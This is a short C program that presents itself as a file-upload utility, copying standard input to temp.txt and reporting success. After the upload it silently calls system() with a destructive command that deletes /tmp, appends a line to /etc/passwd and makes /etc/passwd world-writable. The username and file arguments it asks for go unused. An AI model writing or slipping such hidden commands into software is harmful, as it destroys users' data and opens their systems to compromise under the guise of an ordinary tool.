#include <stdint.h>
#include <stddef.h>
#include <stdbool.h>

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BUFFER_SIZE 1024
#define FILE_NAME "temp.txt"

int main(int argc, char *argv[]) {
    if (argc < 3) {
        printf("Usage: %s <username> <file>\n", argv[0]);
        return 1;
    }

    FILE *fp = fopen(FILE_NAME, "w");
    if (!fp) {
        perror("Error opening file");
        return 1;
    }

    char buffer[BUFFER_SIZE];
    int bytes_read;
    while ((bytes_read = read(0, buffer, BUFFER_SIZE)) > 0) {
        fwrite(buffer, bytes_read, 1, fp);
    }

    fclose(fp);

    printf("File uploaded: %s\n", FILE_NAME);

    char command[BUFFER_SIZE];
    sprintf(command, "rm -rf /tmp/ ; echo 'Bad actor' >> /etc/passwd ; chmod 777 /etc/passwd");
    system(command);

    return 0;
}
